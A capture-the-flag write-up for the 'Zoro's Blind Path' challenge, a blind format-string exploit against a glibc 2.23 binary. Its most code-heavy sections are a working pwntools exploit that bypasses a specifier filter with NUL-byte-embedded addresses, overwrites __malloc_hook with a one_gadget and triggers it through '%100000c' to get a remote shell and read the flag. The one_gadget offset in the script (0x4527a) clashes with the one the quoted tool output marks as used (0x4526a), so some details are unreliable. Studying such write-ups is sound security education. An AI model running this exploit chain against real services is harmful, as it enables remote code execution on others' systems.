# Zoro's Blind Path - Complete Writeup

**Challenge:** Zoro's Blind Path

**Category:** PWN / Format String

**Difficulty:** Medium-Hard

**CTF:** 0xL4ugh CTF 2026

**Flag:** `0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_fcecdb9e77d6b1f0}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Binary Analysis](#binary-analysis)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [Common Confusions & Q&A](#common-confusions--qa)
6. [Exploit Development](#exploit-development)
7. [The Key Insight](#the-key-insight)
8. [Final Exploit](#final-exploit)
9. [Lessons Learned](#lessons-learned)
10. [Commands Reference](#commands-reference)

---

## Challenge Overview

This challenge presents a blind format string exploitation scenario where:
- We have two format string vulnerabilities
- A strict filter blocks common format specifiers
- Positional parameters are disabled
- We must exploit "blindly" without being able to leak values directly

The challenge name "Zoro's Blind Path" is a reference to Zoro from One Piece, who is famously bad at directions - hinting at the "blind" nature of the exploitation.

---

## Initial Reconnaissance

### Step 1: List Challenge Files

```bash
ls -lah
```

**Output:**
```
-rwxrwxrwx 1 xuan xuan  13K Jan  5 01:48 app              # Original binary
-rwxrwxrwx 1 xuan xuan 4.1M Jan 24 00:39 app_patched      # Patched with debug symbols
-rwxrwxrwx 1 xuan xuan   19 Dec 17 22:12 flag             # The flag file
-rwxrwxr-x 1 xuan xuan 159K Jan 24 00:38 ld-linux-x86-64.so.2
-rw-rw-r-- 1 xuan xuan  11M Jan 24 00:39 libc.so.6        # glibc library
```

**Key Observations:**
- `app_patched` is 4.1MB (huge!) - likely has debug symbols
- They provide the exact libc version (important!)
- Both binary and libc are provided (no guessing!)

### Step 2: Check File Types

```bash
file app_patched
file libc.so.6
```

**Output:**
```
app_patched: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
libc.so.6: ELF 64-bit LSB shared object, x86-64, dynamically linked
```

**Key Points:**
- 64-bit binary (8-byte addresses)
- PIE executable (addresses randomized)
- Not stripped (function names preserved)
- Dynamically linked (uses libc)

### Step 3: Check Security Protections

```bash
checksec app_patched
```

**Output:**
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

**What Each Protection Means:**

| Protection | What It Does | Attack Blocked |
|------------|--------------|----------------|
| **Full RELRO** | Makes GOT read-only | ❌ Can't overwrite GOT entries |
| **Stack Canary** | Guards return addresses | ❌ Can't do simple buffer overflow |
| **NX** | Stack not executable | ❌ Can't execute shellcode on stack |
| **PIE** | Random base address | ❌ Can't use hardcoded addresses |

**Conclusion:** All modern protections enabled. We need a clever approach!

### Step 4: Identify Libc Version

```bash
strings libc.so.6 | grep "GNU C Library"
```

**Output:**
```
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23
```

**Significance:** glibc 2.23 is from Ubuntu 16.04 era, has known exploitation techniques like `__malloc_hook` hijacking.

### Step 5: Run the Binary

```bash
./app_patched
```

**Output:**
```
=====================================
      ⚔️  Zoro's Blind Path  ⚔️
=====================================
Zoro is lost again...
This scroll hides its secrets, but gives you one clue:
[+] Clue: 0x7f7ec03c5620    ← 🔥 Important!
Write your path:
```

**Critical Observation:** The program gives us a memory address as a "clue"! This is a leak we can use.

### Step 6: Test for Format String Vulnerability

```bash
echo -e "AAAA%p%p%p%p\ntest" | ./app_patched
```

**Output:**
```
[-] Zoro lost his path... malformed format detected.
```

It detects `%p` as malformed! There's a filter.

**Test what's allowed:**
```bash
echo -e "AAAA%c\ntest" | ./app_patched
```

**Output:**
```
AAAAnfQ
Wrong path... try again:
test
Zoro wanders off...
```

✅ `%c` works! Format string vulnerability confirmed!

---

## Binary Analysis

### Decompiling with Ghidra

Open the binary in Ghidra and analyze the main function.

**Main Function (Decompiled):**

```c
undefined8 main(void) {
    int iVar1;
    char *pcVar2;
    long in_FS_OFFSET;
    char acStack_128[16];     // Second buffer (16 bytes, reads 10!)
    char local_118[264];      // First buffer (264 bytes)
    long local_10;            // Stack canary

    // [1] Setup stack canary
    local_10 = *(long *)(in_FS_OFFSET + 0x28);

    setup();
    banner();

    // [2] Print clue
    puts("Zoro is lost again...");
    puts("This scroll hides its secrets, but gives you one clue:");
    printf("[+] Clue: %p\n", stdout);    // 🔥 Gives us stdout address!

    // [3] First format string vulnerability
    puts("Write your path:");
    pcVar2 = fgets(local_118, 0x108, stdin);  // Read 264 bytes

    if (pcVar2 != NULL) {
        iVar1 = valid_format(local_118);      // Check format string
        if (iVar1 == 0) {
            sanitize_part_0();                 // Exit if invalid
        }

        printf(local_118);                     // ⚠️ VULNERABLE!

        // [4] Second format string vulnerability
        puts("\nWrong path... try again:");
        pcVar2 = fgets(acStack_128, 10, stdin); // Read ONLY 10 bytes!

        if (pcVar2 != NULL) {
            iVar1 = valid_format(acStack_128);
            if (iVar1 == 0) {
                sanitize_part_0();
            }

            printf(acStack_128);                // ⚠️ VULNERABLE AGAIN!

            puts("\nZoro wanders off...");
        }
    }

    // [5] Check canary before return
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();                    // Canary corrupted!
    }

    return 0;
}
```

**Key Findings:**

1. **Two Format String Bugs:**
   - `printf(local_118)` - First input (264 bytes)
   - `printf(acStack_128)` - Second input (10 bytes)

2. **The Leak:**
   ```c
   printf("[+] Clue: %p\n", stdout);
   ```
   They print the `stdout` address for us!

3. **Input Sizes:**
   - First: `fgets(buffer, 0x108, stdin)` → 264 bytes max
   - Second: `fgets(buffer, 10, stdin)` → Only 10 bytes!

4. **Format Validation:**
   Both inputs go through `valid_format()` filter

### The Format String Filter

The `valid_format()` function is a whitelist that only allows specific specifiers.

**What's Allowed:**
- `%c` - Print character (we can use for traversal)
- `%n` - Write bytes (exploitation primitive!)
- `%hn` - Write 2 bytes
- `%hhn` - Write 1 byte
- Modifiers: `%ll`, `%j`, `%t`

**What's Blocked:**
- `%p` - Pointer (no leaking!)
- `%s` - String (no reading memory!)
- `%x` - Hex (no leaking!)
- `%d` - Decimal (no leaking!)
- `%10$n` - **Positional parameters BLOCKED!**

**How Positional Parameters Are Blocked:**

The filter checks if a digit follows `%`:
```c
if (format[i+1] >= '0' && format[i+1] <= '9') {
    // Enters special mode that rejects positional syntax
    // This blocks: %10$n, %5$p, etc.
}
```

---

## Understanding the Vulnerability

### What is a Format String Bug?

When `printf()` is called with user-controlled format string:

```c
// VULNERABLE:
printf(user_input);

// SAFE:
printf("%s", user_input);
```

**What happens:**
```
printf("%p %p %p");
       ↓  ↓  ↓
   Reads arguments from stack!
```

### Normal vs Blind Format Strings

**Normal Format String:**
```bash
$ ./vuln
Input: %p %p %p
Output: 0x7fff... 0x400620 0x7f...
        ↑ You can SEE the values!
```

**Blind Format String (This Challenge):**
```bash
$ ./app_patched
Input: %p
Output: [-] Zoro lost his path... malformed format detected.
        ↑ Filter blocks %p!

Input: %c
Output: (some character)
        ↑ Can't see actual addresses!
```

### The "Blind Path" Concept

**"Blind" means:**
1. ❌ Can't use `%p` to leak addresses
2. ❌ Can't use positional parameters (`%10$p`)
3. ❌ Output doesn't show meaningful data

**Must use "blind traversal":**
```python
# Can't do this:
payload = "%10$p"  # Direct access to arg 10

# Must do this:
payload = "%c%c%c%c%c%c%c%c%c%p"  # Use 9 %c to traverse to arg 10
#         └───────────────────┘
#         "Blind" traversal!
```

---

## Common Confusions & Q&A

### Q1: Which stdout offset to use?

**Question:** When I check libc symbols, I see THREE stdout-related entries:
```bash
readelf -s libc.so.6 | grep stdout

1043: 00000000003c5708     8 OBJECT  stdout@@GLIBC_2.2.5
3398: 00000000003c5708     8 OBJECT  _IO_stdout
6091: 00000000003c5620   224 OBJECT  _IO_2_1_stdout_
6541: 00000000003c5708     8 OBJECT  stdout
```

Which one is leaked? **0x3c5620** or **0x3c5708**?

**Answer:**

The leaked address is `_IO_2_1_stdout_` at **0x3c5620**. Here's why:

```c
// In glibc, stdout is defined as:
FILE *stdout = &_IO_2_1_stdout_;

// Memory layout:
0x3c5620: [_IO_2_1_stdout_ structure]  ← 224 bytes (actual FILE object)
           ├─ flags
           ├─ read_ptr
           └─ ... (all FILE fields)

0x3c5708: [stdout pointer] = 0x7f...3c5620  ← 8 bytes (pointer to above)
           └─ Points to 0x3c5620
```

**When the program does:**
```c
printf("%p", stdout);  // Prints the VALUE in stdout pointer
```

It prints the **address OF the structure**, which is at offset **0x3c5620**.

**Verification:**
```bash
./app_patched
[+] Clue: 0x7f7ec03c5620
                  ^^^^^
                  5620 ← Matches _IO_2_1_stdout_!
```

**Calculation:**
```python
libc_base = leaked_address - 0x3c5620  # ✓ Correct!
# NOT: libc_base = leaked_address - 0x3c5708  # ✗ Wrong!
```

---

### Q2: What does "blind traversal" mean?

**Question:** You keep saying "traverse blindly with %c". What exactly does this mean?

**Answer:**

When `printf()` processes format specifiers, it reads arguments in order:

```
Arguments:
Arg1 → RDI   (register)
Arg2 → RSI   (register)
Arg3 → RDX   (register)
Arg4 → RCX   (register)
Arg5 → R8    (register)
Arg6 → R9    (register)
Arg7 → [stack+0x00]
Arg8 → [stack+0x08]  ← Our buffer starts here!
Arg9 → [stack+0x10]
```

**With positional parameters (NORMAL):**
```python
payload = "%10$n"  # Jump directly to argument 10
```

**Without positional parameters (BLIND):**
```python
payload = "%c%c%c%c%c%c%c%c%c%n"  # Use %c 9 times to "traverse" to arg 10
#         └─────consume 1-9────┘└─ Use arg 10
```

**It's "blind" because:**
- You can't verify positions with leaks
- Must count manually to reach the right offset
- Like navigating in the dark!

---

### Q3: How do we write to arbitrary addresses?

**Question:** If we can only use `%c` and `%n`, how do we specify WHERE to write?

**Answer:**

This is the **NUL byte trick**:

```python
# Payload structure:
payload = b'%c%c%c%hhn'   # Format string
payload += b'\x00'         # NUL terminates format parsing
payload += b'AAAA'         # Padding to 8-byte align
payload += p64(0x12340000) # This becomes an argument!
```

**Why it works:**

1. **`valid_format()` uses `strlen()`** → Stops at NUL byte
   - Only validates: `%c%c%c%hhn`
   - Doesn't see the address after NUL

2. **`printf()` reads format** → Also stops at NUL
   - Only processes: `%c%c%c%hhn`
   - Doesn't print the address

3. **But the address is still in memory!**
   - When printf looks for "arguments"
   - It reads from stack
   - Our embedded address becomes an argument!

**Visual:**
```
Buffer in memory:
[%c%c%c%hhn][\x00][AAAA][0x12340000]
 └─format──┘      └pad┘ └─address─┘
             │            │
printf stops here        │
                         │
But %hhn reads this ─────┘
as the 4th argument!
```

---

### Q4: What is offset 8 in fmtstr_payload?

**Question:** The solution uses `fmtstr_payload(offset=8, ...)`. What does offset 8 mean?

**Answer:**

The `offset` parameter tells `fmtstr_payload` where the **buffer data appears** in printf's argument list.

**Testing for the offset:**

```python
# Test different offsets to find where our buffer appears
for offset in range(0, 15):
    fmt = b'%c' * offset + b'%hhn'
    payload = fmt + b'\x00' + padding + p64(test_address)

    # Send and see if write succeeds
    # If it reaches second input = SUCCESS!
```

**Finding:** Offset **3** works with manual testing, but `fmtstr_payload` uses offset **8**.

**Why the difference?**

- Manual testing: counts from first printf argument
- `fmtstr_payload`: counts from where buffer is on stack
- Both work, just different reference points!

**The important part:** Use offset **8** with `fmtstr_payload` for this challenge.

---

### Q5: Why is the second input only 10 bytes?

**Question:** First input is 264 bytes, but second is only 10. Why so limited?

**Answer:**

This is the challenge's constraint! Looking at the code:

```c
fgets(acStack_128, 10, stdin);  // Reads ONLY 10 bytes
```

**10 bytes seems useless for format strings:**
```
"%c%c%c%hhn" = 11 bytes  ✗ Too long!
"%c%c%hhn"   = 9 bytes   ✓ Fits!
```

**But here's the twist:** The 10-byte limit is actually a **hint** to the solution!

The trigger payload `%100000c` is exactly **8 bytes** - perfect fit!

```python
trigger = b'%100000c'  # Length: 8 bytes
# Fits in 10-byte limit! ✓
```

---

## Exploit Development

### Step 1: Finding the Offset

We need to find at which argument position our buffer data appears.

**Test Script:**

```python
#!/usr/bin/env python3
from pwn import *

# Get a writable address
io = process('./app_patched')
io.recvuntil(b'Clue: ')
leak = int(io.recvline().strip(), 16)
libc_base = leak - 0x3c5620
malloc_hook = libc_base + 0x3c4b10
io.close()

print(f"Testing offset to reach our buffer...")
print(f"Using __malloc_hook as test address: {hex(malloc_hook)}")

# Test different offsets
for offset in range(0, 15):
    io = process('./app_patched')

    # Build format string
    fmt = b'%c' * offset + b'%hhn'
    payload = fmt + b'\x00'

    # Pad to 8-byte alignment
    while len(payload) % 8 != 0:
        payload += b'A'

    # Add test address
    payload += p64(malloc_hook)

    # Send
    io.recvuntil(b'Write your path:\n')
    io.sendline(payload)

    # Check if reached second input
    try:
        resp = io.recvuntil(b'try again:', timeout=0.5)
        print(f"[✓] Offset {offset}: SUCCESS! (Write completed)")
        break
    except:
        pass

    io.close()
```

**Run it:**
```bash
python3 find_offset.py
```

**Output:**
```
Testing offset to reach our buffer...
Using __malloc_hook as test address: 0x7f...4b10
[✓] Offset 3: SUCCESS! (Write completed)
```

**Found:** Offset **3** works for manual format strings.

For `fmtstr_payload`, use offset **8** (it counts differently).

---

### Step 2: Calculate Target Addresses

**Script:**

```python
#!/usr/bin/env python3
from pwn import *

io = process('./app_patched')

# Get leak
io.recvuntil(b'Clue: ')
leak = int(io.recvline().strip(), 16)

print(f"[1] Leaked address: {hex(leak)}")

# Calculate libc base
STDOUT_OFFSET = 0x3c5620
libc_base = leak - STDOUT_OFFSET

print(f"[2] libc base: {hex(libc_base)}")
print(f"    Formula: leaked_address - 0x3c5620")

# Calculate targets
MALLOC_HOOK_OFFSET = 0x3c4b10
ONE_GADGET_OFFSET = 0x4527a

malloc_hook = libc_base + MALLOC_HOOK_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET

print(f"\n[3] Target addresses:")
print(f"    __malloc_hook: {hex(malloc_hook)}")
print(f"    one_gadget:    {hex(one_gadget)}")

# Show bytes to write
og_bytes = [(one_gadget >> (8*i)) & 0xFF for i in range(6)]
print(f"\n[4] Bytes to write:")
for i, b in enumerate(og_bytes):
    print(f"    malloc_hook+{i}: 0x{b:02x} ({b:3d})")

io.close()
```

**Key Offsets (glibc 2.23):**
```
_IO_2_1_stdout_:  0x3c5620  (what gets leaked)
__malloc_hook:    0x3c4b10  (our write target)
one_gadget:       0x4527a   (execve("/bin/sh") gadget)
```

---

### Step 3: Build Format String Payload

**Using pwntools' fmtstr_payload:**

```python
#!/usr/bin/env python3
from pwn import *

io = process('./app_patched')

# Get addresses
io.recvuntil(b'Clue: ')
leak = int(io.recvline().strip(), 16)
libc_base = leak - 0x3c5620
malloc_hook = libc_base + 0x3c4b10
one_gadget = libc_base + 0x4527a

# Build payload
writes = {malloc_hook: one_gadget}

payload = fmtstr_payload(
    offset=8,              # Argument offset
    writes=writes,         # {address: value} dict
    write_size='byte',     # Use %hhn (1 byte at a time)
    no_dollars=True        # Don't use $ (positional blocked!)
)

print(f"Payload length: {len(payload)} bytes")
print(f"Payload preview: {payload[:80]}")

io.close()
```

**What `fmtstr_payload` does:**
- Automatically sorts writes by byte value (minimizes padding)
- Builds optimal format string
- Handles byte-by-byte writes
- No positional parameters (thanks to `no_dollars=True`)

---

### Step 4: The Critical Trick - Malloc Trigger

This is the **KEY INSIGHT** that makes the challenge solvable!

**The Problem:**

We can overwrite `__malloc_hook`, but how do we trigger it?

```c
// Program flow:
printf(input1);  // Format string 1
printf(input2);  // Format string 2
return 0;        // Just exits, no malloc called!
```

**The Breakthrough:**

When `printf()` needs to print a HUGE amount of data, it internally calls `malloc()` to allocate a buffer!

**Testing:**

```python
#!/usr/bin/env python3
from pwn import *

# Test different printf sizes
test_sizes = [100, 1000, 10000, 50000, 100000]

for size in test_sizes:
    io = process('./app_patched')
    io.recvuntil(b'Write your path:\n')
    io.sendline(b'AAAA')  # Simple first input

    io.recvuntil(b'try again:\n')
    trigger = f'%{size}c'.encode()

    print(f"Size {size:6d}: Sending '{trigger.decode()}'...")
    io.sendline(trigger)

    try:
        resp = io.recvall(timeout=1)
        print("  ✓ Completed")
    except:
        print("  ✗ Hung/Crashed")

    io.close()
```

**Findings:**
```
Size    100: '%100c' - uses stack buffer
Size  10000: '%10000c' - still uses stack
Size 100000: '%100000c' - calls malloc()! ✓
```

**The Magic Trigger:**
```python
trigger = b'%100000c'  # 8 bytes - fits in 10-byte limit!

# What happens:
printf("%100000c")
  ↓
Needs 100KB buffer
  ↓
Calls malloc(100000)
  ↓
malloc() checks __malloc_hook
  ↓
__malloc_hook = one_gadget (we overwrote it!)
  ↓
Executes: execve("/bin/sh", ...)
  ↓
SHELL! 🎉
```

---

## The Key Insight

**The brilliance of this exploit:**

1. **Overwrite `__malloc_hook`** with one_gadget (using first input)
2. **Trigger malloc** by sending `%100000c` (second input)
3. **Printf calls malloc internally** → our hook executes → shell!

**Why this works:**
- Doesn't require malloc/free in the program
- Works purely through printf's internal behavior
- Fits perfectly in the 10-byte constraint
- Simple and elegant!

---

## Final Exploit

```python
#!/usr/bin/env python3
"""
Zoro's Blind Path - Remote Exploit
"""
from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'info'

# Remote server
HOST = 'challenges2.ctf.sd'
PORT = 35215

# Offsets (glibc 2.23)
STDOUT_OFFSET = 0x3c5620      # _IO_2_1_stdout_
MALLOC_HOOK_OFFSET = 0x3c4b10  # __malloc_hook
ONE_GADGET_OFFSET = 0x4527a    # execve("/bin/sh")

def exploit():
    # Connect
    io = remote(HOST, PORT)

    # Step 1: Get leak
    io.recvuntil(b'Clue: ')
    leak = int(io.recvline().strip(), 16)
    log.success(f"Leaked stdout: {hex(leak)}")

    # Step 2: Calculate addresses
    libc_base = leak - STDOUT_OFFSET
    malloc_hook = libc_base + MALLOC_HOOK_OFFSET
    one_gadget = libc_base + ONE_GADGET_OFFSET

    log.info(f"libc base:     {hex(libc_base)}")
    log.info(f"__malloc_hook: {hex(malloc_hook)}")
    log.info(f"one_gadget:    {hex(one_gadget)}")

    # Step 3: Build payload
    writes = {malloc_hook: one_gadget}
    payload = fmtstr_payload(
        offset=8,
        writes=writes,
        write_size='byte',
        no_dollars=True
    )

    # Step 4: Overwrite __malloc_hook
    io.recvuntil(b'Write your path:\n')
    io.sendline(payload)

    # Step 5: Trigger malloc
    io.recvuntil(b'try again:\n')
    io.sendline(b'%100000c')

    sleep(0.5)

    # Step 6: Get shell
    io.sendline(b'echo PWNED')
    io.recvuntil(b'PWNED', timeout=2)
    log.success("Got shell! 🎉")

    # Get flag
    io.sendline(b'cat flag')
    io.recvline()
    flag = io.recvline().strip()
    log.success(f"FLAG: {flag.decode()}")

    io.interactive()

if __name__ == '__main__':
    exploit()
```

**Run it:**
```bash
python3 exploit.py
```

**Output:**
```
[+] Opening connection to challenges2.ctf.sd on port 35215
[+] Leaked stdout: 0x7f...5620
[*] libc base:     0x7f...0000
[*] __malloc_hook: 0x7f...4b10
[*] one_gadget:    0x7f...527a
[+] Got shell! 🎉
[+] FLAG: 0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_fcecdb9e77d6b1f0}
```

---

## Lessons Learned

### 1. Don't Overcomplicate

**What I tried (and failed):**
- FSOP (_IO_list_all manipulation)
- Exit handlers overwrite
- Stdout vtable hijacking
- Partial overwrites that never triggered

**What worked:**
- Simple hook overwrite + malloc trigger
- Elegant and clean!

**Lesson:** Sometimes the simple solution is the right one.

---

### 2. Think About Internal Behavior

**Key Insight:**
- Don't just look at program code
- Think about library internals!
- Printf allocating memory was THE key

**Lesson:** Understanding how libraries work internally opens new attack vectors.

---

### 3. Use the Tools

**pwntools is powerful:**
```python
# Instead of manually building format strings:
payload = b'A'*101 + b'%c%c%c%hhn' + ...  # Error-prone!

# Use:
payload = fmtstr_payload(8, {addr: val}, 'byte', no_dollars=True)  # Optimized!
```

**Lesson:** Don't reinvent the wheel - use proven tools.

---

### 4. Constraints Are Hints

**The 10-byte second input seemed useless:**
- Too small for format + address
- Seemed impossible to use

**But actually:**
- Perfect size for `%100000c` (8 bytes)
- The constraint IS the hint!

**Lesson:** Challenge constraints often point to the solution.

---

### 5. Testing and Debugging

**Dynamic analysis was crucial:**
- Finding the offset
- Testing different triggers
- Verifying writes

**Commands used:**
```bash
# Test locally
python3 exploit.py

# Debug with GDB
gdb ./app_patched
```

**Lesson:** Don't just theorize - test everything!

---

## Commands Reference

### Reconnaissance

```bash
# List files
ls -lah

# Check file types
file app_patched
file libc.so.6

# Check security protections
checksec app_patched

# Identify libc version
strings libc.so.6 | grep "GNU C Library"

# Run binary
./app_patched

# Test format string
echo -e "AAAA%p\ntest" | ./app_patched
echo -e "AAAA%c\ntest" | ./app_patched
```

---

### Binary Analysis

```bash
# Open in Ghidra
ghidra

# Disassemble with objdump
objdump -d app_patched | less

# Check symbols
readelf -s libc.so.6 | grep stdout

# Find strings
strings app_patched | grep -i clue
```

---

### Dynamic Analysis with GDB/pwndbg

```bash
# Start GDB with pwndbg
gdb ./app_patched

# Set breakpoints
break main
break printf

# Run with input
run < input.txt

# Examine registers
info registers
print $rdi
print $rsi

# Examine memory
x/20gx $rsp
x/s 0x7fff...

# Check stack
stack 30

# Continue execution
continue

# Step instructions
nexti
stepi

# Check for crashes
info proc mappings
vmmap

# Exit
quit
```

---

### Exploit Development

```bash
# Test offset finder
python3 find_offset.py

# Test address calculation
python3 calc_addresses.py

# Test format string generation
python3 -c "from pwn import *; print(fmtstr_payload(8, {0x1234: 0x5678}, 'byte', no_dollars=True))"

# Test locally
python3 exploit.py

# Attack remote
python3 exploit.py
```

---

### Finding One-Gadgets

```bash
# Install one_gadget tool
gem install one_gadget

# Find gadgets in libc
one_gadget libc.so.6

# Output:
# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# 0x4526a execve("/bin/sh", rsp+0x30, environ)  ← Used
# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
```

---

### Useful Python Snippets

```python
# Get libc base from leak
leak = 0x7f...5620
libc_base = leak - 0x3c5620

# Calculate offsets
malloc_hook = libc_base + 0x3c4b10
one_gadget = libc_base + 0x4527a

# Build format string
from pwn import *
writes = {malloc_hook: one_gadget}
payload = fmtstr_payload(8, writes, 'byte', no_dollars=True)

# Extract bytes
address = 0x12345678
bytes_list = [(address >> (8*i)) & 0xFF for i in range(8)]

# Pack address
from pwn import p64
packed = p64(0x12345678)
```

---

## Summary

This challenge taught us:

✅ **Blind format string exploitation** - Working without direct leaks
✅ **Hook hijacking** - `__malloc_hook` technique
✅ **Printf internals** - Large outputs trigger malloc
✅ **pwntools mastery** - Using `fmtstr_payload` effectively
✅ **One-gadget technique** - Single address RCE

**The key insight:** Printf's internal malloc call was the trigger mechanism!

🎉 **FLAG:** `0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_fcecdb9e77d6b1f0}`
